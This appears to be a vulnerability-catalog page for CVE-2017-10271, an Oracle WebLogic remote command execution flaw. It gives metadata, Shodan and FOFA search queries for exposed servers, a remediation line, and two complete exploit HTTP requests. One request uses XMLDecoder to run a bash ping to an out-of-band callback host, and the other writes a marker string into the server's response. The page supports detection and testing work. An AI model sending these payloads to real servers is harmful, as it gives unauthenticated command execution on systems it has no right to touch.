---
layout: "post"
cve_id: "CVE-2017-10271"
title: "Oracle WebLogic Server - Remote Command Execution"
pcap: true
pcap_path: "/pcaps/2017/CVE-2017-10271.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-10271.yaml"
author: "dr_set,ImNightmaree,true13"
severity: "high"
impact: "Successful exploitation of this vulnerability allows remote attackers to execute arbitrary commands with the privileges of the WebLogic server.
"
remediation: "Apply the latest security patches provided by Oracle to fix this vulnerability. Additionally, restrict network access to the WebLogic server and implement strong authentication mechanisms.
"
reference:
  - "https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2017-10271"
  - "https://github.com/SuperHacker-liuan/cve-2017-10271-poc"
  - "http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html"
  - "https://nvd.nist.gov/vuln/detail/CVE-2017-10271"
  - "http://www.securitytracker.com/id/1039608"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 'cvss-score': 7.5, 'cve-id': 'CVE-2017-10271', 'epss-score': 0.9441, 'epss-percentile': 0.99975, 'cpe': 'cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'oracle', 'product': 'weblogic_server', 'shodan-query': ['http.title:"oracle peoplesoft sign-in"', 'product:"oracle weblogic"'], 'fofa-query': 'title="oracle peoplesoft sign-in"', 'google-query': 'intitle:"oracle peoplesoft sign-in"'}"
tags:
  - "cve"
  - "cve2017"
  - "weblogic"
  - "oast"
  - "kev"
  - "vulhub"
  - "rce"
  - "oracle"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security) is susceptible to remote command execution. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. This easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.


## üåê HTTP Request
```nohighlight
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Connection: close
Content-Length: 1048
Accept: */*
Accept-Language: en
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext
            xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>ping -c 1 d5j0lbhle0o4le4nau60os9eny1dxt4ir.oast.fun</string>
                        </void>
                    </array>
                    <void method="start"/></void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

```nohighlight
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Connection: close
Content-Length: 947
Accept: */*
Accept-Language: en
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                  <void class="java.lang.Thread" method="currentThread">
                      <void method="getCurrentWork">
                          <void method="getResponse">
                              <void method="getServletOutputStream">
                                  <void method="flush"/>
                              </void>
                              <void method="getWriter"><void method="write"><string>38CEKGbEMKf45omgqcpPsbfHx43</string></void></void>
                          </void>
                      </void>
                  </void>
              </java>
          </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>
```

